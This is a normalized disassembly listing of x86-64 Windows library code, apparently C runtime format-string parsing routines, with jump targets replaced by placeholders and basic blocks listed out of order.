je r-xdata
and r12d 0xfffffff7
cmp edi r13d
cmovg edi r13d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x30 ]
mov r15d 0x1
jmp r-xdata
mov [ rsp + 0x70 ] 0x1
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x6c ] r10d
mov r14 [ rsp + 0x50 ]
test r12b 0x4
je r-xdata
mov rdi rbx
mov esi r15d
mov r14d [ rsp + 0x5c ]
mov r13 [ rsp + 0x78 ]
sub r14d r15d
sub r14d edi
test r12b 0xc
jne r-xdata
mov rcx rbx
call sub_18001e2c0
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov r15d eax
jmp r-xdata
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
mov [ rsp + 0x70 ] 0x1
jmp r-xdata
mov edx [ rsp + 0x48 ]
lea ecx [ r9 + 0x20 ]
add ax 0x51
lea edx [ rcx - 0x2e ]
mov [ rsp + 0x60 ] cx
mov [ rsp + 0x62 ] ax
jmp r-xdata
cmp [ rsp + 0x44 ] 0xffffffff
mov rbx [ r14 ]
mov eax 0x7fffffff
cmove edi eax
add r14 0x8
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
mov ecx 0x75
cmp eax ecx
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x74 ]
mov rax r8
lea rbx [ rbp + 0x1cf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
or r12d r11d
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x20
mov r8 r13
mov edx r14d
call sub_180023de4
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov r13 [ rsp + 0x78 ]
or esi 0xffffffff
mov [ rsp + 0x40 ] esi
jmp r-xdata
mov rdx [ rsp + 0x78 ]
movzx ecx [ rsp + 0x64 ]
lea r8 [ rsp + 0x40 ]
call sub_180023dac
add rdi r13
xor r10d r10d
test esi esi
jg r-xdata
cmp [ rsp + 0x70 ] r10d
jne r-xdata
mov eax 0x8000
test eax r12d
je r-xdata
test rbx rbx
mov [ rsp + 0x58 ] 0x1
cmove rbx [ rw-data ]
mov rax rbx
jmp r-xdata
test rbx rbx
mov r15d r10d
cmove rbx [ rw-data ]
mov rsi rbx
test edi edi
jle r-xdata
mov r9d 0xa
mov ecx 0x78
cmp eax ecx
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1cf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov r15d eax
test r13d r12d
je r-xdata
mov rax [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x70 ]
lea r9 [ rbp - 0x70 ]
lea rcx [ rsp + 0x64 ]
movsxd r8 [ rax + 0x10c ]
mov rdx rdi
dec esi
call sub_180026b30
xor r10d r10d
movsxd r13 eax
test eax eax
jle r-xdata
mov r13 [ rsp + 0x78 ]
jmp r-xdata
test edi edi
jne r-xdata
mov esi [ rsp + 0x40 ]
cmp [ rsi ] r10b
je r-xdata
lea eax [ rcx - 0x51 ]
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
mov eax 0x30
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_18001e2c0
xor r10d r10d
mov r15 rax
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov ecx 0x67
cmp eax 0x63
je r-xdata
mov esi [ rsp + 0x40 ]
dec edi
cmp [ rax ] r10w
je r-xdata
sub rax rbx
sar rax 0x1
mov r15d eax
jmp r-xdata
movzx ecx [ rsi ]
lea rdx [ rbp - 0x70 ]
call sub_180026cb0
xor r10d r10d
test eax eax
je r-xdata
mov [ rsp + 0x74 ] eax
mov r9d 0x10
mov r13d 0x200
test r12b r12b
jns r-xdata
dec rbx
inc r15d
mov [ rbx ] al
jmp r-xdata
cmp [ rbx ] al
je r-xdata
mov edi 0x2d
bt r12d 0xb
jae r-xdata
jmp r-xdata
add rax 0x2
inc r15d
inc rsi
cmp r15d edi
jl r-xdata
inc rsi
movsx r15d [ rax ]
mov [ rsp + 0x58 ] r10d
jmp r-xdata
movsx eax [ rax ]
mov [ rsp + 0x58 ] 0x1
cdq
sub eax edx
sar eax 0x1
mov r15d eax
jmp r-xdata
sub_180021b30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi r9
mov rdi r8
mov rbx rdx
cmp rcx [ rdx ]
jne r-xdata
mov eax 0x1
cmp [ r8 ] r9
jne r-xdata
mov rdx [ rdx ]
mov rcx [ rdi ]
mov r8d 0x4
call sub_18002098c
test rax rax
je r-xdata
mov rcx [ rbx ]
mov edx 0x4
call sub_180020880
mov [ rdi ] rax
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rdi ] rax
mov rcx [ rbx ]
add rcx rcx
mov [ rbx ] rcx
mov rax [ rsp + 0x50 ]
mov rdx rsi
mov [ rax ] 0x1
mov r8 [ rbx ]
mov rcx [ rdi ]
add r8 r8
call sub_18001c4a0
mov r11 [ rbx ]
add r11 r11
mov [ rbx ] r11
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180021bcc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov rdi rcx
mov rsi [ rsp + 0x38 ]
movzx eax bx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx 0x8
movzx ecx bx
call sub_180023d44
test eax eax
jne r-xdata
inc [ rdi ]
mov rcx rsi
call sub_180026e44
movzx ebx ax
mov eax 0xffff
cmp bx ax
je r-xdata
sub_180021c1c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x2c0 ]
sub rsp 0x3c0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2b0 ] rax
xor r14d r14d
lea r12 [ rbp - 0x10 ]
mov [ rbp - 0x48 ] r9
mov eax r14d
movzx esi r14w
mov rbx rdx
mov [ rsp + 0x70 ] rdx
mov rdi rcx
mov [ rbp - 0x80 ] rcx
mov [ rbp - 0x4c ] eax
mov [ rsp + 0x38 ] esi
mov [ rbp - 0x78 ] r12
mov [ rbp - 0x58 ] 0x15e
mov [ rbp - 0x68 ] r14d
mov [ rsp + 0x68 ] r14
mov [ rsp + 0x48 ] r14d
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or eax 0xffffffff
jmp r-xdata
lea rcx [ rbp - 0x38 ]
mov rdx r8
call sub_18001db70
movzx eax [ rbx ]
mov [ rsp + 0x3c ] r14b
mov r15d r14d
mov [ rsp + 0x30 ] r14d
mov [ rsp + 0x40 ] r14d
mov r13d r14d
mov [ rsp + 0x78 ] r14d
test ax ax
je r-xdata
mov rcx [ rbp + 0x2b0 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x410 ]
add rsp 0x3c0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rbp - 0x20 ] r14b
je r-xdata
mov r13d 0xffff
mov r12d 0x25
mov eax r13d
mov rax [ rbp - 0x28 ]
and [ rax + 0xc8 ] 0xfffffffd
mov r10 [ rsp + 0x70 ]
cmp r12w [ r10 ]
jne r-xdata
lea rcx [ rsp + 0x40 ]
dec r15d
mov rdx rdi
mov [ rsp + 0x40 ] r15d
call sub_180021bcc
cmp r13w ax
je r-xdata
inc r15d
mov rcx rdi
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_180026e44
mov rbx [ rsp + 0x70 ]
movzx esi ax
movzx eax [ rbx ]
add rbx 0x2
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x70 ] rbx
cmp ax si
jne r-xdata
cmp r12w [ r10 + 0x2 ]
je r-xdata
add rbx 0x2
mov edx 0x8
movzx ecx [ rbx ]
call sub_180023d44
test eax eax
jne r-xdata
mov rdx rdi
movzx ecx ax
call sub_180027040
cmp r13w si
je r-xdata
cmp r13w si
jne r-xdata
cmp r12w [ r10 ]
jne r-xdata
xor r8d r8d
mov eax r14d
movzx r13d r14w
lea r11d [ r8 + 0x1 ]
mov [ rsp + 0x4c ] eax
mov edx r14d
mov al r8b
mov [ rbp - 0x70 ] r13d
mov [ rsp + 0x58 ] r14d
mov r13b r11b
mov [ rsp + 0x5c ] edx
mov [ rbp - 0x18 ] r8
mov [ rsp + 0x60 ] r8b
mov [ rsp + 0x44 ] r8b
mov [ rsp + 0x34 ] al
mov dil r8b
mov [ rbp - 0x50 ] r8b
mov r12b r8b
mov r15d r8d
or esi 0xffffffff
mov r15d [ rsp + 0x40 ]
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x30 ] r15d
jmp r-xdata
mov rbx [ rsp + 0x68 ]
mov r12d [ rsp + 0x48 ]
jmp r-xdata
mov rdx rdi
movzx ecx si
call sub_180027040
movzx eax [ rbx ]
test ax ax
je r-xdata
cmp [ rbx ] r12w
jne r-xdata
lea rax [ r10 + 0x2 ]
cmp r12w [ rax ]
cmove r10 rax
mov [ rsp + 0x70 ] r10
cmp ebx 0x2a
je r-xdata
movzx ecx bl
call sub_180026d40
mov edx [ rsp + 0x5c ]
mov r10 [ rsp + 0x70 ]
xor r8d r8d
lea r11d [ r8 + 0x1 ]
test eax eax
je r-xdata
mov r9d 0x1
jmp r-xdata
mov eax 0x6e
cmp [ rbx + 0x2 ] ax
jne r-xdata
add al r11b
mov [ rsp + 0x34 ] al
cmp ebx 0x46
je r-xdata
mov al [ rsp + 0x34 ]
lea eax [ r14 + r14 * 4 ]
add edx r11d
lea r14d [ rbx + rax * 2 - 0x30 ]
mov [ rsp + 0x5c ] edx
jmp r-xdata
mov eax 0x1
cmp [ rbp - 0x68 ] eax
jne r-xdata
mov rcx rbx
call sub_18001c80c
mov edx 0x8
movzx ecx ax
call sub_180023d44
test eax eax
je r-xdata
add r10 0x2
mov ecx 0xff00
movzx ebx [ r10 ]
mov [ rsp + 0x70 ] r10
test cx bx
jne r-xdata
mov esi [ rsp + 0x38 ]
mov [ rsp + 0x35 ] r13b
mov r13d [ rbp - 0x70 ]
mov [ rsp + 0x50 ] r15d
mov r15 [ rbp - 0x18 ]
mov [ rsp + 0x54 ] r14d
mov cl al
test al al
jne r-xdata
mov al [ rsp + 0x34 ]
test dil dil
je r-xdata
cmp ebx 0x49
je r-xdata
cmp r13w si
jne r-xdata
mov rcx [ rbp - 0x78 ]
call sub_18001c80c
mov eax 0x1
mov [ rbp - 0x70 ] r8
mov rax [ rbp - 0x48 ]
mov [ rbp - 0x40 ] rax
add rax 0x8
mov [ rbp - 0x48 ] rax
mov rax [ rax - 0x8 ]
mov [ rbp - 0x70 ] rax
jmp r-xdata
movzx eax [ r10 + 0x2 ]
cmp ax 0x36
jne r-xdata
cmp ebx 0x4c
je r-xdata
cmp r12d eax
jne r-xdata
mov eax [ rsp + 0x78 ]
test eax eax
jne r-xdata
movzx r14d [ r10 ]
mov eax 0x6e
or r14d 0x20
cmp r14d eax
je r-xdata
cmp [ r10 ] 0x53
je r-xdata
mov bl r8b
test r12b r12b
jne r-xdata
cmp ax 0x33
jne r-xdata
lea rcx [ r10 + 0x4 ]
cmp [ rcx ] 0x34
jne r-xdata
add r13b r11b
jmp r-xdata
cmp ebx 0x4e
je r-xdata
mov r13d [ rsp + 0x78 ]
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
cmp [ rbp - 0x20 ] r14b
je r-xdata
cmp [ rbp - 0x20 ] r14b
je r-xdata
mov dl [ rsp + 0x3c ]
test dl dl
jne r-xdata
mov edi [ rsp + 0x54 ]
test edx edx
je r-xdata
cmp r14d 0x63
je r-xdata
mov r12b 0xff
cmp [ r10 ] 0x43
mov r12b r11b
jne r-xdata
mov ecx 0x64
cmp ax cx
je r-xdata
lea rcx [ r10 + 0x4 ]
cmp [ rcx ] 0x32
jne r-xdata
mov r10 rcx
mov [ rsp + 0x70 ] rcx
cmp ebx 0x68
je r-xdata
mov eax [ rsp + 0x78 ]
jmp r-xdata
mov rcx [ rbp - 0x28 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x28 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
test cl cl
jne r-xdata
test edi edi
je r-xdata
mov eax [ rsp + 0x30 ]
mov rcx [ rbp - 0x80 ]
add eax r11d
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x40 ] eax
call sub_180026e44
movzx esi ax
cmp r14d 0x7b
je r-xdata
add r15d r11d
mov [ rbp - 0x60 ] r8
jmp r-xdata
mov ecx 0x69
cmp ax cx
je r-xdata
mov r10 rcx
mov [ rsp + 0x70 ] rcx
jmp r-xdata
add r13b sil
add r12b sil
jmp r-xdata
mov ecx 0x6c
cmp ebx ecx
je r-xdata
mov r9 [ rbp - 0x40 ]
jmp r-xdata
cmp r14d 0x63
je r-xdata
mov r13d 0xffff
cmp r13w si
je r-xdata
mov rbx [ rsp + 0x68 ]
mov r12d r15d
mov r13d eax
jmp r-xdata
mov r10 [ rsp + 0x70 ]
mov edx [ rsp + 0x5c ]
mov cl [ rsp + 0x34 ]
xor r8d r8d
lea r11d [ r8 + 0x1 ]
mov rdx [ rbp - 0x80 ]
lea rcx [ rsp + 0x40 ]
call sub_180021bcc
movzx esi ax
mov eax [ rsp + 0x40 ]
mov [ rsp + 0x30 ] eax
jmp r-xdata
mov ecx 0x6f
cmp ax cx
je r-xdata
lea rax [ r10 + 0x2 ]
cmp [ rax ] cx
jne r-xdata
cmp ebx 0x77
je r-xdata
mov eax 0x6f
cmp r14d eax
jg r-xdata
mov r8 [ rbp - 0x40 ]
mov rax [ r8 ]
add r8 0x8
mov r15d [ r8 ]
mov r9 r8
mov [ rbp - 0x40 ] r8
add r8 0x8
mov [ rbp - 0x70 ] rax
mov [ rbp - 0x48 ] r8
cmp r15 r11
jb r-xdata
cmp r14d 0x73
je r-xdata
mov rbx [ rsp + 0x68 ]
mov r12d r15d
jmp r-xdata
mov rdx [ rbp - 0x80 ]
movzx ecx si
call sub_180027040
xor r14d r14d
mov eax 0xffff
mov [ rsp + 0x38 ] esi
cmp ax si
je r-xdata
mov ecx 0x78
cmp ax cx
je r-xdata
add r13b r11b
mov r10 rax
mov [ rsp + 0x70 ] rax
jmp r-xdata
add r12b r11b
jmp r-xdata
jmp r-xdata
cmp r14d 0x70
je r-xdata
je r-xdata
xor r14d r14d
test r12b r12b
jle r-xdata
xor r8d r8d
cmp r14d 0x7b
jne r-xdata
mov ecx 0x58
cmp ax cx
je r-xdata
add dil r11b
jmp r-xdata
mov r12d [ rsp + 0x50 ]
mov [ rsp + 0x35 ] r11b
mov [ rbp - 0x60 ] r8
add r12d r11d
jmp r-xdata
cmp r14d 0x73
je r-xdata
mov r12d [ rsp + 0x50 ]
cmp r14d 0x63
je r-xdata
mov [ rax ] r14b
mov [ rax ] r14w
jmp r-xdata
add r15d r11d
mov [ rbp - 0x60 ] r8
mov eax 0x2d
cmp ax si
jne r-xdata
movzx edi [ rbp - 0x50 ]
test r12b r12b
cmovg edi r11d
jmp r-xdata
cmp r14d 0x75
je r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov [ rsp + 0x44 ] r11b
jmp r-xdata
test edx edx
jne r-xdata
mov eax 0x64
cmp r14d eax
je r-xdata
call sub_18001e6e4
mov [ rax ] 0xc
mov ecx [ rsp + 0x30 ]
mov rbx [ rbp - 0x70 ]
mov r8d 0x1
sub ecx r8d
mov eax 0xffff
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x40 ] ecx
cmp ax si
je r-xdata
mov eax 0x78
cmp r14d eax
je r-xdata
mov eax 0x78
sub edi r11d
mov [ rsp + 0x54 ] edi
jne r-xdata
test r12b r12b
jle r-xdata
add edi r11d
mov [ rsp + 0x5c ] r11d
mov [ rsp + 0x54 ] edi
jle r-xdata
cmp r14d 0x63
je r-xdata
mov rdx [ rbp - 0x80 ]
movzx ecx si
call sub_180027040
mov ecx [ rsp + 0x30 ]
mov r8d 0x1
mov eax 0x2d
cmp ax si
jne r-xdata
cmp r14d 0x7b
je r-xdata
test bl bl
mov ebx [ rsp + 0x4c ]
jne r-xdata
test bl bl
mov rbx [ rbp - 0x60 ]
jne r-xdata
mov r15d [ rsp + 0x30 ]
mov rcx [ rbp - 0x80 ]
add r15d r11d
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_180026e44
movzx esi ax
mov eax 0x78
mov [ rsp + 0x38 ] esi
jmp r-xdata
test edx edx
je r-xdata
mov edi [ rbp - 0x50 ]
mov dil r11b
jmp r-xdata
cmp [ r10 ] si
jne r-xdata
cmp r14d 0x67
jle r-xdata
mov r12b [ rsp + 0x60 ]
mov r13d [ rsp + 0x54 ]
sub r15 r8
mov eax 0x2b
cmp ax si
jne r-xdata
mov [ rsp + 0x44 ] r11b
jmp r-xdata
mov edi [ rbp - 0x50 ]
test r12b r12b
mov eax 0x5e
movzx edi dil
cmovg edi r11d
add r10 0x2
mov [ rsp + 0x70 ] r10
cmp ax [ r10 ]
jne r-xdata
cmp [ rsp + 0x44 ] dil
je r-xdata
mov r13d [ rsp + 0x54 ]
cmp [ rsp + 0x44 ] dil
je r-xdata
mov r13d [ rsp + 0x54 ]
xor edi edi
test r12d r12d
je r-xdata
mov bl r11b
jmp r-xdata
mov r13d 0xffff
cmp r13w si
je r-xdata
mov dl [ rsp + 0x3c ]
mov r15d [ rsp + 0x30 ]
xor r14d r14d
dec dl
mov [ rsp + 0x3c ] dl
test cl cl
jne r-xdata
xor r14d r14d
mov edi r14d
lea ecx [ r14 + 0x2d ]
cmp cx si
jne r-xdata
cmp r14d 0x69
je r-xdata
add ecx r8d
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x40 ] ecx
mov rcx [ rbp - 0x80 ]
call sub_180026e44
movzx esi ax
mov eax 0xffff
mov [ rsp + 0x38 ] esi
cmp ax si
je r-xdata
mov eax r13d
sub r13d r8d
test eax eax
je r-xdata
mov r13 [ rbp - 0x80 ]
mov r12d [ rsp + 0x30 ]
sub edi r11d
mov [ rsp + 0x54 ] edi
jne r-xdata
mov rbx [ rsp + 0x68 ]
test rbx rbx
jne r-xdata
add r10 0x2
mov [ rsp + 0x60 ] 0xff
mov [ rsp + 0x70 ] r10
mov eax [ rsp + 0x58 ]
cmp r14d 0x46
mov r14d 0x0
cmove eax r14d
test eax eax
je r-xdata
neg ebx
mov [ rsp + 0x4c ] ebx
mov eax 0xff00
test ax si
jne r-xdata
cmp r14d 0x70
je r-xdata
neg rbx
mov [ rbp - 0x60 ] rbx
jmp r-xdata
mov eax 0xff00
test ax si
jne r-xdata
cmp r14d 0x70
je r-xdata
mov rbx [ rsp + 0x68 ]
mov r12d 0x1
xor r14d r14d
mov r9d r12d
jmp r-xdata
mov rdx [ rbp - 0x80 ]
movzx ecx si
call sub_180027040
mov rbx [ rsp + 0x70 ]
mov rdi [ rbp - 0x80 ]
mov eax 0x1
add [ rsp + 0x3c ] al
add rbx 0x2
mov r13d 0xffff
mov [ rsp + 0x70 ] rbx
lea r12d [ rax + 0x24 ]
jmp r-xdata
mov [ rbp - 0x48 ] r9
jmp r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov rax [ rbp - 0x78 ]
mov rdi r11
mov [ rax ] cx
jmp r-xdata
mov r14d eax
mov eax 0x6e
cmp r14d eax
jne r-xdata
mov r15d [ rsp + 0x30 ]
mov r8d 0x1
mov r13d 0xffff
sub r15d r8d
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp r13w si
je r-xdata
cmp r14d 0x63
je r-xdata
mov r15d [ rsp + 0x30 ]
mov r13d 0xffff
jmp r-xdata
mov r12d [ rsp + 0x50 ]
lea r15d [ rax - 0x2f ]
mov rcx r13
add r12d r15d
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x40 ] r12d
call sub_180026e44
movzx esi ax
lea eax [ r15 + 0x77 ]
mov [ rsp + 0x38 ] esi
cmp ax si
je r-xdata
mov r12d [ rsp + 0x30 ]
mov r13 [ rbp - 0x80 ]
add r12d r11d
mov rcx r13
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x40 ] r12d
call sub_180026e44
movzx esi ax
mov [ rsp + 0x38 ] esi
jmp r-xdata
test edx edx
je r-xdata
xor r12d r12d
mov ecx 0x2000
call sub_180020800
xor r12d r12d
mov rbx rax
mov [ rsp + 0x68 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x68 ]
mov r12d r14d
mov r13d 0xffff
jmp r-xdata
cmp [ rsp + 0x34 ] r14b
jne r-xdata
dec r15d
mov eax 0xffff
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp ax si
je r-xdata
movzx ebx si
movzx edi bl
mov ecx edi
call sub_180026dc0
test eax eax
je r-xdata
mov eax 0xff00
test ax si
jne r-xdata
dec r15d
mov eax 0xffff
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp ax si
je r-xdata
movzx ebx si
movzx edi bl
mov ecx edi
call sub_180026dc0
test eax eax
je r-xdata
mov eax 0xff00
test ax si
jne r-xdata
cmp [ rbp - 0x4c ] r9d
jne r-xdata
mov r12d [ rsp + 0x54 ]
mov r15d [ rsp + 0x30 ]
mov r13 [ rbp - 0x80 ]
mov r13 [ rbp - 0x80 ]
mov r12d [ rsp + 0x54 ]
mov r15d [ rsp + 0x30 ]
mov rcx r13
sub r12d r11d
add r15d r11d
call sub_180026e44
mov edx [ rsp + 0x5c ]
movzx esi ax
mov [ rsp + 0x38 ] esi
jmp r-xdata
mov r15d [ rsp + 0x30 ]
xor r14d r14d
mov eax r15d
test cl cl
jne r-xdata
xor edx edx
mov rdx [ rbp - 0x80 ]
movzx ecx si
call sub_180027040
mov r8d 0x1
xor edx edx
cmp [ rsp + 0x34 ] dl
jne r-xdata
cmp r14d 0x73
jne r-xdata
mov rax [ rbp - 0x70 ]
cmp rbx rax
je r-xdata
add r12d r15d
mov rcx r13
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x40 ] r12d
call sub_180026e44
xor ecx ecx
movzx esi ax
mov [ rsp + 0x38 ] esi
cmp [ rsp + 0x5c ] ecx
je r-xdata
lea ecx [ rax - 0x20 ]
cmp cx si
je r-xdata
mov eax 0x30
cmp ax si
jne r-xdata
mov bl r11b
movzx ecx [ r10 ]
mov r9d 0x1
cmp dx cx
je r-xdata
lea eax [ rdx - 0x3d ]
mov r13d edx
add r10 0x2
mov [ rbx + 0xb ] al
mov r13d 0xffff
lea eax [ r12 + 0x1 ]
mov [ rbp - 0x4c ] eax
jmp r-xdata
inc [ rsp + 0x78 ]
mov eax [ rsp + 0x4c ]
jmp r-xdata
mov ebx [ rsp + 0x4c ]
mov rdx [ rbp - 0x80 ]
movzx ecx si
call sub_180027040
xor edi edi
mov eax [ rsp + 0x4c ]
mov ecx edi
shl eax 0x4
mov [ rsp + 0x4c ] eax
call sub_180026d40
xor edi edi
test eax eax
je r-xdata
movzx eax si
movzx ecx al
call sub_180026d40
test eax eax
je r-xdata
mov rbx [ rbp - 0x60 ]
mov rdx [ rbp - 0x80 ]
movzx ecx si
call sub_180027040
xor edi edi
shl [ rbp - 0x60 ] 0x4
mov ecx edi
call sub_180026d40
xor edi edi
test eax eax
je r-xdata
movzx eax si
movzx ecx al
call sub_180026d40
test eax eax
je r-xdata
mov rax [ rbp - 0x38 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx + 0x58 ]
mov ecx 0x1
movzx ebx [ rax ]
movsx eax sil
cmp ebx eax
jne r-xdata
mov ebx 0x1
test edx edx
mov eax 0xffffffff
cmove r12d eax
mov eax 0xff00
test ax si
jne r-xdata
mov r12d [ rsp + 0x50 ]
mov rbx [ rsp + 0x68 ]
mov r12d [ rsp + 0x48 ]
jmp r-xdata
cmp [ rsp + 0x34 ] dl
jne r-xdata
mov ecx [ rsp + 0x30 ]
add rbx 0x2
mov r8d 0x1
jmp r-xdata
test r15 r15
je r-xdata
cmp r14d 0x7b
jne r-xdata
cmp si 0x9
jb r-xdata
mov eax 0x78
mov r14d eax
jmp r-xdata
sub edi 0x2
mov [ rsp + 0x54 ] edi
cmp edi r15d
jge r-xdata
mov [ rsp + 0x58 ] r15d
cmp r14d eax
je r-xdata
cmp [ r10 ] r12w
je r-xdata
lea esi [ r9 + 0x2c ]
xor edx edx
mov r8d 0x2000
mov rcx rbx
call sub_18001c9f0
mov r10 [ rsp + 0x70 ]
mov edx 0x5d
cmp dx [ r10 ]
jne r-xdata
test r12d r12d
je r-xdata
mov esi 0xffdf
and si bx
sub si 0x7
movzx esi bx
jmp r-xdata
mov eax 0x6f
cmp r14d eax
jne r-xdata
mov esi 0xffdf
and si bx
sub si 0x7
movzx esi bx
jmp r-xdata
mov eax 0x6f
cmp r14d eax
jne r-xdata
mov ebx [ rsp + 0x58 ]
test ebx ebx
je r-xdata
mov eax r12d
sub r12d ecx
test eax eax
je r-xdata
mov eax r12d
sub r12d ebx
test eax eax
je r-xdata
mov rcx [ rbp - 0x70 ]
cmp [ rsp + 0x35 ] r14b
je r-xdata
mov rax [ rbp - 0x70 ]
mov rcx [ rbp - 0x60 ]
mov [ rax ] rcx
jmp r-xdata
xor r14d r14d
add [ rsp + 0x78 ] r8d
cmp r14d 0x63
je r-xdata
cmp [ rsp + 0x5c ] edx
je r-xdata
call sub_18001e6e4
xor r14d r14d
mov r13d 0xffff
mov [ rax ] 0xc
mov r12d r14d
lea r9d [ r14 + 0x1 ]
test dil dil
je r-xdata
test dil dil
je r-xdata
mov rcx [ rsp + 0x68 ]
movzx eax si
movzx edx si
shr rax 0x3
and edx 0x7
movsx ecx [ rax + rcx ]
movsx eax r12b
xor ecx eax
bt ecx edx
jae r-xdata
mov eax 0x20
cmp si ax
jne r-xdata
cmp si 0xd
jbe r-xdata
mov r12d [ rsp + 0x50 ]
jmp r-xdata
add bl r15b
sub r12d r15d
mov eax 0xffff
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x40 ] r12d
cmp ax si
je r-xdata
xor ecx ecx
cmp [ rsp + 0x5c ] ecx
je r-xdata
mov r12d [ rsp + 0x48 ]
xor r14d r14d
mov r13d 0xffff
jmp r-xdata
mov [ rsp + 0x70 ] r10
jmp r-xdata
movzx r13d cx
movzx r8d cx
movzx eax cx
mov edx r9d
test r13w r13w
je r-xdata
add r15d ecx
mov rcx [ rbp - 0x80 ]
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_180026e44
movzx esi ax
mov eax 0x78
mov [ rsp + 0x38 ] esi
jmp r-xdata
sub r13d ecx
je r-xdata
mov ebx [ rsp + 0x4c ]
mov [ rsp + 0x38 ] esi
lea eax [ rbx + rbx * 4 ]
lea ebx [ rax + rax ]
jmp r-xdata
mov eax 0x38
cmp ax si
jbe r-xdata
add r15d ecx
mov rcx [ rbp - 0x80 ]
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_180026e44
movzx esi ax
mov eax 0x78
mov [ rsp + 0x38 ] esi
jmp r-xdata
sub r13d ecx
je r-xdata
mov rbx [ rbp - 0x60 ]
mov [ rsp + 0x38 ] esi
lea rbx [ rbx + rbx * 4 ]
add rbx rbx
jmp r-xdata
mov eax 0x38
cmp ax si
jbe r-xdata
mov eax 0x1
mov ecx 0xffff
sub r15d eax
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp cx si
je r-xdata
mov edx 0x65
cmp dx si
je r-xdata
add r15d ecx
mov rcx r13
call sub_180026e44
lea r9 [ rbp - 0x10 ]
lea r8 [ rbp - 0x78 ]
movzx esi ax
mov rax [ rbp - 0x78 ]
lea rdx [ rbp - 0x58 ]
mov [ rax + rdi * 2 ] bx
lea rax [ rbp - 0x68 ]
mov ebx 0x1
add rdi rbx
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x20 ] rax
mov rcx rdi
call sub_180021b30
test eax eax
je r-xdata
mov rcx [ rbp - 0x78 ]
add [ rsp + 0x58 ] ebx
movsx eax sil
mov [ rcx + rdi * 2 ] ax
lea rax [ rbp - 0x68 ]
add rdi rbx
lea r9 [ rbp - 0x10 ]
lea r8 [ rbp - 0x78 ]
lea rdx [ rbp - 0x58 ]
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_180021b30
test eax eax
je r-xdata
mov [ rcx ] ax
jmp r-xdata
mov [ rcx ] eax
jmp r-xdata
xor r14d r14d
test dil dil
je r-xdata
mov [ rbx ] r14b
mov [ rbx ] r14w
jmp r-xdata
mov [ rsp + 0x4c ] edx
mov rdx [ rbp - 0x70 ]
lea rcx [ rsp + 0x4c ]
movzx r9d si
mov r8 r15
call sub_180027408
cmp eax 0x22
je r-xdata
mov rdx [ rbp - 0x70 ]
mov ecx [ rsp + 0x30 ]
mov r8d 0x1
